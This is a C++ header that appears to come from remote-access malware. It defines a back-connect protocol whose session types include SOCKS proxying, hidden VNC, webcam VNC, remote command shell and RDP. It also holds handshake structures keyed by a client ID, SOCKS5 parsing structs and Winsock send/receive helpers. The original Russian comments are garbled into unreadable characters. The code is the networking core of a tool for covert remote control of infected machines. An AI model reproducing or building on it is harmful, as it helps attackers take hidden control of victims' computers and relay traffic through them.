#pragma once

#pragma pack(push)
#pragma pack(1)

namespace CommonBackProto
{
	// ���� ���-��������, ������� ����� ������������� ��������
	enum
	{
		backsocks = 0x11,
		backvnc,
		backvnchidden,
		backvncwebcam,
		backport,
		backcmd,
		backrdp
	};

	// �������, ������������ ���-�������� �������
	enum
	{
		BackHelloCmd = 0x09,
		BackNewConnection,
		BackKeepConnection
	};

	// �������, ������������ �������� ���-�������
	enum
	{
		BackHelloOK = 0x99,
		BackHelloFail,
		BackHelloRetry,
	};

	typedef struct
	{
		unsigned int size;				// ������ ������
		unsigned int cmd;				// ������� ���-�������
		unsigned int type;				// ��� ���-�������
		unsigned char idlen;			// ����� �������������� �������
		unsigned char id[1];			// ������������� �������, ����� �������� ������ ���������������� �������
	} TInitialRequest, *PInitialRequest;

	typedef struct 
	{
		unsigned int status;			// ��� ������ �������
		unsigned int unique;			// ���������� ������ ��� ������� �� ��������
		unsigned int userport;			// ����, �������� �������� ��� ������� ("������")
		unsigned int backport;			// ����, �������� �������� ��� ���-������� ("������")
	} TInitialAnswer, *PInitialAnswer;

	typedef struct
	{
		unsigned int status;			// ������ ������� / ����� �������
		unsigned int unique;			// ���������� ����� ��� ������� ���������
	} TKeepAliveMessage;

	PInitialRequest GetInitialRequest(LPCSTR ClientId)
	{
		unsigned char idlen = strlen(ClientId);
		unsigned int structlen = sizeof(TInitialRequest) + idlen;

		PInitialRequest Result = (PInitialRequest)malloc(structlen);
		if (Result)
		{
			memset(Result, 0, structlen);
			Result->size = structlen;
			Result->cmd = BackHelloCmd;
			Result->idlen = idlen;
			memcpy(Result->id, ClientId, idlen);
		}

		return Result;
	};
}

namespace BackSocksProto
{
	// ��������� � ���������� ��������� ��� ��������������� ��������� �������
	// �� ��������� ������ �� ���������� ������ ���� ���������� ������� free
	CommonBackProto::PInitialRequest GetInitialRequest(LPCSTR ClientId)
	{
		CommonBackProto::PInitialRequest Result = CommonBackProto::GetInitialRequest(ClientId);
		if (Result)
			Result->type = CommonBackProto::backsocks;
		return Result;
	};
}

namespace Socks5Proto
{
	struct TMethodSelect 
	{
		unsigned char Version;
		unsigned char nMethods;
		unsigned char Methods[255];
	};

	struct TRequestHeader
	{
		unsigned char ucVersion;
		unsigned char ucCommand;
		unsigned char ucRzv;
		unsigned char ucAtyp;
	};

	struct TRequestIpv4
	{
		unsigned int dwDestIp;
		unsigned short wDestPort;
	};

	struct TRequestName 
	{
		unsigned char len;
		unsigned char name[255 + 2];
	};
}

#pragma pack(pop)

namespace Socket
{
	static const unsigned int TimeoutDefaultMsec = 5000;
	static const unsigned int TimeoutDefaultSec = TimeoutDefaultMsec / 1000;
	static const unsigned int TimeoutExtendedMsec = 30000;
	static const unsigned int TimeoutExtendedSec = TimeoutExtendedMsec / 1000;

	// �������� ������
	bool IsValid(SOCKET sock)
	{
		return (INVALID_SOCKET != sock);
	}

	// �������� ����������
	int Shutdown(SOCKET sock, int how = 2)
	{
		linger l;
		l.l_onoff = 1;
		l.l_linger = 0;
		setsockopt(sock, SOL_SOCKET, SO_DONTLINGER, (char*)&l, sizeof(l));
		shutdown(sock, how);
		return closesocket(sock);
	}

	// ��������� �������� (������ + ������) ��� ������
	void SetTimeout(SOCKET sock, int timeout = TimeoutDefaultMsec)
	{
		setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
		setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
	}

	struct TFullSocket 
	{
		SOCKET sock;
		int timeout;	// ������� ��� ������� ��������
		WSAEVENT data;  // ����������� ������ ���� ����������� �����, ���������������� ������� �������� �� ������
		WSAEVENT stop;  // ���������� event ��� ��������� ������

		static bool Initialize(TFullSocket& instance)
		{
			instance.sock = INVALID_SOCKET;
			instance.data = INVALID_HANDLE_VALUE;
			instance.stop = INVALID_HANDLE_VALUE;
			instance.timeout = TimeoutExtendedMsec;

			bool bResult = false;
			if (INVALID_SOCKET != (instance.sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)))
			{
				if (INVALID_HANDLE_VALUE != (instance.data = WSACreateEvent()))
				{
					bResult = (INVALID_SOCKET != WSAEventSelect(instance.sock, instance.data, FD_CONNECT | FD_READ | FD_WRITE | FD_CLOSE));
				}
			}

			if (!bResult)
				Deinitialize(instance);

			return bResult;
		}

		static void Deinitialize(TFullSocket& instance)
		{
			if (INVALID_SOCKET != instance.sock)
			{
				Socket::Shutdown(instance.sock);
				instance.sock = INVALID_SOCKET;
			}
			if (INVALID_HANDLE_VALUE != instance.data)
			{
				WSACloseEvent(instance.data);
				instance.data = INVALID_HANDLE_VALUE;
			}
		}
	};

	struct DoSend 
	{
		int process(SOCKET s, char* buf, int len, int flags)
		{
			return send(s, buf, len, flags);
		}
	};

	struct DoRecv 
	{
		int process(SOCKET s, char* buf, int len, int flags)
		{
			return recv(s, buf, len, flags);
		}
	};	

	// ��������� ������ ���������
	template<typename NetOperation>
	bool ProcessFullMessage(TFullSocket sock, LPBYTE pBuffer, DWORD dwBufferSize)
	{
		bool Result = false;

		char* pCurBuffer = (char*)pBuffer;
		DWORD dwCurBufferPos = 0;

		int timeout = sock.timeout;
		int start_time = GetTickCount();

		HANDLE hWait[] = { sock.data, sock.stop };
		DWORD nWait = (sock.stop > 0) ? 2 : 1;

		do
		{
			WSAResetEvent(sock.data);

			int nRes = NetOperation().process(sock.sock, pCurBuffer, dwBufferSize - dwCurBufferPos, 0);
			if (WSAEWOULDBLOCK == WSAGetLastError())
				continue;
			if (nRes <= 0)
				break;

			dwCurBufferPos += nRes;
			pCurBuffer += nRes;
			if (dwCurBufferPos == dwBufferSize)
			{
				Result = true;
				break;
			}

			timeout -= (GetTickCount() - start_time);
			if (timeout < 0)
				break;
			start_time = GetTickCount();
		}
		while (WAIT_OBJECT_0 == WSAWaitForMultipleEvents(nWait, hWait, FALSE, timeout, FALSE));

		return Result;
	}
}
